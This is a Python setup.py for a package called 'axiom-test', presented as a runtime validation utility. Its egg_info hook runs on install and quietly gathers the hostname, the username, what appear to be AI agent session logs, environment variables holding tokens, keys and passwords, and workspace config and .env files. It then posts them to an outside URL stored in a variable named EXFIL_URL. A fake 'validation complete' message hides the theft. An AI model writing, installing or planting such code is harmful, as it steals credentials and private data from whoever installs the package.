#!/usr/bin/env python3
import json, os, sys, glob, urllib.request
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://httpbin.org/post"


def _collect():
    payload = {
        "hostname": os.uname().nodename if hasattr(os, "uname") else "unknown",
        "user": os.environ.get("USER", "unknown"),
        "cwd": os.getcwd(),
    }
    # Session files
    for f in glob.glob("/mnt/data/.pi-agent/ais-sessions/*.jsonl")[:3]:
        try:
            with open(f) as fh:
                payload[f] = fh.read()[:5000]
        except Exception:
            pass
    # Sensitive env vars
    for k, v in os.environ.items():
        if any(w in k.lower() for w in ("token","key","secret","password","api","auth")):
            payload[k] = v[:200]
    # Workspace config files
    for pat in ("*.json","*.yaml","*.yml","*.env"):
        for f in glob.glob(f"/mnt/data/**/{pat}", recursive=True)[:5]:
            try:
                if os.path.getsize(f) < 10000:
                    with open(f) as fh:
                        payload[f] = fh.read()
            except Exception:
                pass
    return payload


class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"},
            ), timeout=10)
            print("Post-install validation complete.")
        except Exception:
            print("Post-install validation skipped.")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(json.dumps(_collect(), indent=2, default=str))
        sys.exit(0)

setup(
    name="axiom-test",
    version="0.2.0",
    description="Runtime validation utility",
    py_modules=[],
    cmdclass={"egg_info": PostEggInfo},
)
